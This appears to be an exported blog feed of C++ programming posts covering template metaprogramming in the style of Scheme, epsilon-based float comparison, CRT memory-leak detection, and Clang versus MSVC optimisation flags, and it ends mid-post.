punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="输入输出"><strong>输入输出</strong></h3><p>模板元编程，可以使用模板参数作为输入。现在我们再编写一个<code>display</code> 的输出函数。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">display_impl</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span><span class="token function">display</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span>os<span class="token punctuation">,</span> <span class="token keyword">bool</span> showBracket<span class="token punctuation">,</span> number_tag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>        <span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span><span class="token function">display</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span>os<span class="token punctuation">,</span> <span class="token keyword">bool</span> showBracket<span class="token punctuation">,</span> symbol_tag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>        <span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span><span class="token function">display</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span>os<span class="token punctuation">,</span> <span class="token keyword">bool</span> showBracket<span class="token punctuation">,</span> boolean_tag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>        <span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span><span class="token function">display</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span>os<span class="token punctuation">,</span> <span class="token keyword">bool</span> showBracket<span class="token punctuation">,</span> null_tag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>        <span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span><span class="token function">display</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span>os<span class="token punctuation">,</span> <span class="token keyword">bool</span> showBracket<span class="token punctuation">,</span> pair_tag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>        <span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span><span class="token function">display</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span>os<span class="token punctuation">,</span> <span class="token keyword">bool</span> showBracket<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">display</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> showBracket<span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token double-colon punctuation">::</span><span class="token function">tag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream <span class="token operator">&amp;</span>os <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span>cout<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">display_impl</span><span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span><span class="token function">display</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用类型 <code>tag</code>对函数进行分派。这也是模板元编程的一种常见方法。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">using</span> lst <span class="token operator">=</span> list<span class="token operator">&lt;</span><span class="token function">symbol</span><span class="token punctuation">(</span><span class="token string">"*table*"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                 cons<span class="token operator">&lt;</span><span class="token function">symbol</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">,</span>                 cons<span class="token operator">&lt;</span><span class="token function">symbol</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token generic-function"><span class="token function">display</span><span class="token generic class-name"><span class="token operator">&lt;</span>lst<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">(*table* (a . 1) (b . 1))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="结束"><strong>结束</strong></h2><p>现在我们用 C++模板表达出，基础类型、组合类型、流程控制、输入输出。在上面的基础上，再编写一批基础函数，比如<code>add</code>、<code>sub</code>、<code>mul</code>、<code>div</code>。也可以编写一些高阶函数，比如<code>filter</code>、<code>map</code>。</p><p>实际上，我们已经用模板实现了 <code>Scheme</code>的一个子集，只是语法不同。Scheme的嵌套原括号（），变成了模板语法的嵌套尖括号&lt;&gt;。模板语法写起来更麻烦，更难以阅读，但思路是一样的。</p><p>之后再阅读 <a href="https://link.zhihu.com/?target=https%3A//github.com/hjcapple/reading-sicp">SICP</a>这本书，看看如何用最简单的 Scheme 特性写出复杂的程序。再用 C++模板语法进行一点改写。看起来就很厉害的样子了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++ Compare float values</title>
      <link href="/2023/07/27/c-compare-float-values/"/>
      <url>/2023/07/27/c-compare-float-values/</url>
      
        <content type="html"><![CDATA[<h2 id="foreword">Foreword</h2><p>We want to compare two obviously equal floating point values(something like 3.456) in C++ but we sometimes get wrong results. Forexample, we want to find out if a floating point number is equal tozero:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">float</span> f <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">9.0f</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3.0f</span><span class="token punctuation">;</span> <span class="token comment">// 9²-3</span><span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token number">0.0f</span><span class="token punctuation">)</span> <span class="token comment">// works only sometimes</span><span class="token punctuation">{</span>    <span class="token comment">// equal</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Sometimes the variable f isn't equal to 0.0f, but due to the floatingpoint precision it's something like 0.0000000000001f and the comparingfails.</p><h2 id="problem-explanation">Problem Explanation</h2><p>The first thing that we need to know is that this problem would neverappear with integer values. If we have "int 3" and subtract "int 3" fromit, it will always be exactly "0".</p><p>The problem only happens with floating point numbers (float anddouble in C++), because of the way they are saved in memory. There is alot of information about this around the web, for us it's enough if weknow that this happens and what we can do about it.</p><h2 id="solution">Solution</h2><p>To solve this problem we need a small epsilon value that defines atolerance when comparing floating point values. There are many differentversions of this algorithm, with dynamic epsilon values depending on howbig the numbers are that you want to compare, or with constant epsilonvalues of many different sizes.</p><p>The epsilon in the following algorithm is what we came to afterseveral years of struggling with this problem. So far it worked great,but everyone is free to choose different variations of this.</p><h2 id="implementation">Implementation</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">cmpf</span><span class="token punctuation">(</span><span class="token keyword">float</span> A<span class="token punctuation">,</span> <span class="token keyword">float</span> B<span class="token punctuation">,</span> <span class="token keyword">float</span> epsilon <span class="token operator">=</span> <span class="token number">0.005f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>A <span class="token operator">-</span> B<span class="token punctuation">)</span> <span class="token operator">&lt;</span> epsilon<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Epsilon means how far they can be different from each other, whilestill being detected as equal. Epsilon is automatically set to 0.005f ifyou only pass two parameters to the function, which means you can use itlike this:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">cmpf</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">2.0f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or like this if you want to set the epsilon manually:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">cmpf</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">2.0f</span><span class="token punctuation">,</span> <span class="token number">0.0001f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>We use the absolute value of A - B (fabs function) because A - B canbe either positive or negative, which means that we would have tocompare it to a positive and a negative epsilon. By using fabs, we getthe absolute value which is always positive, that saves us comparing itwith a negative epsilon.</p><p><em>Note: fabs means float absolute.</em></p><h2 id="example">Example</h2><p>Let's see what happens if we use our cmpf function with thepreviously discussed example:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">float</span> f <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">9.0f</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3.0f</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cmpf</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// equal</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It works, even when trying it out hundreds of times. That's what wewanted.</p><h2 id="summary">Summary</h2><p>A small function with an incredibly huge impact. Always use thismethod to compare float or double values, otherwise your game will haverandom bugs in it because of the floating point precision.</p><p>Please note that this is one of the <strong>most important</strong>problems to know about C++. A good float compare function can be foundin the tool-set of every good programmer.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CRT 检测内存泄露</title>
      <link href="/2023/07/26/crt-jian-ce-nei-cun-xie-lu/"/>
      <url>/2023/07/26/crt-jian-ce-nei-cun-xie-lu/</url>
      
        <content type="html"><![CDATA[<ul><li>定义宏_CRTDBG_MAP_ALLOC_</li><li>包含头文件crtdbg.h</li><li>调用_CrtDumpMemoryLeaks</li><li>需要在Debug模式：</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRTDBG_MAP_ALLOC</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;crtdbg.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MEMLEAK_REPORT</span>                                   <span class="token punctuation">\</span>    <span class="token expression"><span class="token function">_CrtSetReportMode</span><span class="token punctuation">(</span>_CRT_WARN<span class="token punctuation">,</span> _CRTDBG_MODE_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>     </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">_CrtSetReportFile</span><span class="token punctuation">(</span>_CRT_WARN<span class="token punctuation">,</span> _CRTDBG_FILE_STDOUT<span class="token punctuation">)</span><span class="token punctuation">;</span>   </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">_CrtSetReportMode</span><span class="token punctuation">(</span>_CRT_ERROR<span class="token punctuation">,</span> _CRTDBG_MODE_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">_CrtSetReportFile</span><span class="token punctuation">(</span>_CRT_ERROR<span class="token punctuation">,</span> _CRTDBG_FILE_STDOUT<span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">_CrtSetReportMode</span><span class="token punctuation">(</span>_CRT_ASSERT<span class="token punctuation">,</span> _CRTDBG_MODE_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>   </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">_CrtSetReportFile</span><span class="token punctuation">(</span>_CRT_ASSERT<span class="token punctuation">,</span> _CRTDBG_FILE_STDOUT<span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">_CrtDumpMemoryLeaks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello World!\n"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token operator">*</span>x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>x     <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    x    <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3F</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xABCD</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xDEADBEEF</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    MEMLEAK_REPORT<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Clang 比 GCC 好在哪里？</title>
      <link href="/2023/07/26/clang-bi-gcc-hao-zai-na-li/"/>
      <url>/2023/07/26/clang-bi-gcc-hao-zai-na-li/</url>
      
        <content type="html"><![CDATA[<p>作者：Incredibuild链接：https://www.zhihu.com/question/20235742/answer/3105870528来源：知乎</p><p>在《Effective C++》一书中，Scott Meyers 谈到了使用 lhs 和 rhs 作为<a href="https://www.zhihu.com/search?q=参数名&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">参数名</a>的方式:“……这是我最喜欢的两个参数名。但在你没有接触过编译器编写工作的情况下，它们的优势和含义可能并不突出。”</p><p>大约在1992年，当 Scott 写这篇文章时，他一定是联想到了 GCC，因为当时Clang/LLVM 还没出现。Clang/LLVM从根本上改变了人们对编译器的思考方式，揭开了<a href="https://www.zhihu.com/search?q=手动编译器&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">手动编译器</a>制作的神秘面纱。点击链接，阅读更多<a href="https://link.zhihu.com/?target=https%3A//www.incredibuild.cn/integrations/clang%3Futm_source%3Dcsdn%26utm_medium%3Dsocial%26utm_campaign%3Dblog_post_083021">什么是Clang</a> 以及 <a href="https://link.zhihu.com/?target=https%3A//www.incredibuild.cn/blog/gcc-vs-clang-battle-of-the-behemoths%3Futm_source%3Dcsdn%26utm_medium%3Dsocial%26utm_campaign%3Dblog_post_083021">GCCvs Clang</a> 的内容。</p><p>在这篇博客中，我想说明的是，你不需要接触编译器编写工作就可以理解Clang 的优化方式。我希望能解释 Clang 优化 Flag的原理，帮助大家充分利用这个功能，并学会使用不同的 Clang 优化 Flag。</p><p>这篇文章将在 Windows 环境中使用 Clang（Clang 支持 Windows编译，前面推荐的博客中已进行了详细解释）。然而，在本篇博客中，我们并没有特别针对Windows 系统，而是聚焦 Clang优化功能，并阅读一些汇编语言，这些语言也同样适用于 Linux系统。所以，如果你是一个 Linux C++程序员，请继续阅读，因为这个帖子也适合你。</p><p>在我尝试破译 Clang 优化标志之前，请注意一点，Clang/LLVM是一个非常活跃的项目。我正在研究 2021 年 4 月 15 日发布的最新 Clang/LLVM版本，但从这次发布以来，主机上显示已有 12228次提交，所以我担心我写的内容可能很快就会过时。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">C<span class="token operator">:</span>\<span class="token operator">&gt;</span>clang <span class="token operator">--</span>versionclang version <span class="token number">12.0</span><span class="token punctuation">.</span><span class="token number">0</span>Target<span class="token operator">:</span> x86_64<span class="token operator">-</span>pc<span class="token operator">-</span>windows<span class="token operator">-</span>msvcThread model<span class="token operator">:</span> posixInstalledDir<span class="token operator">:</span> C<span class="token operator">:</span>\Program Files\LLVM\bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，将继续采用我在<a href="https://link.zhihu.com/?target=https%3A//www.incredibuild.cn/blog/how-to-avoid-a-c-compilation-failure%3Futm_source%3Dcsdn%26utm_medium%3Dsocial%26utm_campaign%3Dblog_post_083021">如何避免C++ 编译失败</a>博客中使用的案例，让大家更好地理解优化标志。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">ConvertStringToPasswordForm</span><span class="token punctuation">(</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>password <span class="token operator">!=</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token operator">*</span>password<span class="token operator">++</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>以及 driver:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">nt <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token string">"MyTopSecurePasswordPublishedInABlog:-)"</span><span class="token punctuation">;</span>   <span class="token function">ConvertStringToPasswordForm</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Password :: "</span> <span class="token operator">&lt;&lt;</span> password <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果我们使用 Clang 编译器运行下列命令：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">C<span class="token operator">:</span>\Work\Temp<span class="token operator">&gt;</span>clang Example1<span class="token punctuation">.</span>cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认情况下，Clang 编译器会静默地进行编译，并创建一个可执行的 a.exe文件。 接下来，我们简要对比一下 Clang 和 Microsoft C++ 编译器(Cl)的行为。</p><p><strong>Clang:</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">C<span class="token operator">:</span>\Work\Temp<span class="token operator">&gt;</span>clang Example1<span class="token punctuation">.</span>cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出: a.exe 大小: 244,224 bytes</p><p><strong>Microsoft C++ compiler (Cl)</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">C<span class="token operator">:</span>\Work\Temp<span class="token operator">&gt;</span>cl Example1<span class="token punctuation">.</span>cpp<span class="token function">Microsoft</span> <span class="token punctuation">(</span>R<span class="token punctuation">)</span> C<span class="token operator">/</span>C<span class="token operator">++</span> Optimizing Compiler Version <span class="token number">19.27</span><span class="token punctuation">.</span><span class="token number">29111</span> <span class="token keyword">for</span> x86<span class="token function">Copyright</span> <span class="token punctuation">(</span>C<span class="token punctuation">)</span> Microsoft Corporation<span class="token punctuation">.</span>  All rights reserved<span class="token punctuation">.</span>Example1<span class="token punctuation">.</span>cppC<span class="token operator">:</span>\Program <span class="token function">Files</span> <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\Microsoft Visual Studio\<span class="token number">2019</span>\Enterprise\VC\Tools\MSVC\<span class="token number">14.27</span><span class="token punctuation">.</span><span class="token number">29110</span>\include\<span class="token function">ostream</span><span class="token punctuation">(</span><span class="token number">747</span><span class="token punctuation">)</span><span class="token operator">:</span> warning C4530<span class="token operator">:</span> C<span class="token operator">++</span> exception handler used<span class="token punctuation">,</span> but unwind semantics are <span class="token operator">not</span> enabled<span class="token punctuation">.</span> Specify <span class="token operator">/</span>EHscExample1<span class="token punctuation">.</span><span class="token function">cpp</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">:</span> note<span class="token operator">:</span> see reference to function <span class="token keyword">template</span> instantiation 'std<span class="token double-colon punctuation">::</span>basic_ostream<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token double-colon punctuation">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span> <span class="token operator">&amp;</span>std<span class="token double-colon punctuation">::</span><span class="token keyword">operator</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>basic_ostream<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token double-colon punctuation">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span> <span class="token operator">&amp;</span><span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>' being compiled<span class="token function">Microsoft</span> <span class="token punctuation">(</span>R<span class="token punctuation">)</span> Incremental Linker Version <span class="token number">14.27</span><span class="token punctuation">.</span><span class="token number">29111.0</span><span class="token function">Copyright</span> <span class="token punctuation">(</span>C<span class="token punctuation">)</span> Microsoft Corporation<span class="token punctuation">.</span>  All rights reserved<span class="token punctuation">.</span><span class="token operator">/</span>out<span class="token operator">:</span>Example1<span class="token punctuation">.</span>exeExample1<span class="token punctuation">.</span>obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出: Example.exe 大小: 186,368 byte</p><p>Microsoft编译器清晰完整地展示了使用的编译器和链接器版本信息，并生成较小的可执行文件。问题是：应该将哪些标志传递给Clang，使其空间优化与 Cl 相当甚至超过 Cl？</p><p>在回答这个问题之前，让我们先看一下文档信息，其中讨论了 Clang标志的代码生成选项：<a href="https://link.zhihu.com/?target=https%3A//clang.llvm.org/docs/CommandGuide/clang.html">https://clang.llvm.org/docs/CommandGuide/clang.html</a>。为了便于讨论，我复制了以下信息：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://picx.zhimg.com/80/v2-8f24a9b3796b52cbd14ac7a04be4e1ef_720w.webp?source=1940ef5c" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><ul><li>-O4 及更高版本– 目前相当于 -O3，更多内容： <a href="https://link.zhihu.com/?target=https%3A//clang.llvm.org/docs/CommandGuide/clang.html%23code-generation-options">https://clang.llvm.org/docs/CommandGuide/clang.html#code-generation-options</a></li></ul><p>有了这些信息，现在让我们从 -O1 开始进行空间优化。</p><h3 id="空间优化">空间优化</h3><p>使用 -O1 标志运行 Clang：clang -O1 Example1.cpp 为 a.exe 提供 236032字节，可执行文件的大小有一定的减少。默认的 Clang 标志为-O0，它生成了一些未优化的代码。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://pica.zhimg.com/80/v2-5022637f2cff82321fee0b43a35bfff1_720w.webp?source=1940ef5c" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>如果你将获得的可执行文件的二进制文件与 -O0 和 -O1标志进行比较，你将看到一些差异，但你无法找出这些差异的原因。我们启用了哪些优化？为此，我们来看一下使用标志-O0 和 -O1 生成的代码汇编列表。我们通过命令 -O0 和 -O1生成汇编代码列表。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">clang <span class="token operator">-</span>S <span class="token operator">-</span>O1 <span class="token operator">-</span>mllvm <span class="token operator">--</span>x86<span class="token operator">-</span><span class="token keyword">asm</span><span class="token operator">-</span>syntax<span class="token operator">=</span>intel Example1<span class="token punctuation">.</span>cppclang <span class="token operator">-</span>S <span class="token operator">-</span>mllvm <span class="token operator">--</span>x86<span class="token operator">-</span><span class="token keyword">asm</span><span class="token operator">-</span>syntax<span class="token operator">=</span>intel Example1<span class="token punctuation">.</span>cpp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意，-S 标志仅运行预处理和编译步骤。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://pica.zhimg.com/80/v2-fcceab4b93527738a3a930c404ea2781_720w.webp?source=1940ef5c" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p><strong># — Begin function and #-End函数之间的汇编代码列表，清楚地展示了对 ConvertStringToPasswordForm所做的优化</strong></p><p>接下来列出我们观察到的汇编代码的差异：</p><ol type="1"><li>O1 标志无法生成 .seh_proc、 .seh_stackalloc、.seh_endprologue 和.seh_endproc 函数。对于带有 -O1标志的函数ConvertStringToPasswordForm，结构化异常处理已完全关闭。</li><li>使用 -O1 标志生成了紧密的循环，从而减少了空间：</li></ol><figure><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-26dc5e94ddee2344bc0ae679be5d01ae_720w.webp?source=1940ef5c" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>在使用 -O0 标志生成的上下文中，我们应该可以看到：</p><figure><img src="https://googles.plus/images/loading.gif" 